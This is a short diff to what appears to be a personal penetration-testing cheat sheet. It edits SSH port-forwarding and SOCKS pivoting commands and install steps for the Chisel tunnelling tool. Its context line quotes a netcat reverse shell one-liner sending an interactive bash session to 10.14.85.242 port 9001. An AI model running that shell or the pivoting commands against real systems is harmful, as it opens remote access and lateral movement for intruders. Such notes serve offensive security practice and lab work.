@@ -43,14 +43,16 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ## SSH ✡️
 ```bash
 ssh -L 7777:localhost:8888 user@10.10.10.10
-ssh -R 12340:localhost:9999 user@10.10.10.10
+ssh -R 12340:localhost:9999 user@10.10.10.10 # for 
 ssh -C2qTnN -D 1080 user@target.host
 ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
 -oHostKeyAlgorithms=+ssh-rsa
 ```
 ## Chisel ✡️
 ```bash
-https://github.com/jpillora/chisel
+gh repo clone jpillora/chisel
+go install github.com/jpillora/chisel@latest
+
 ```
 [port-forwarding](https://fumenoid.github.io/posts/port-forwarding)
 
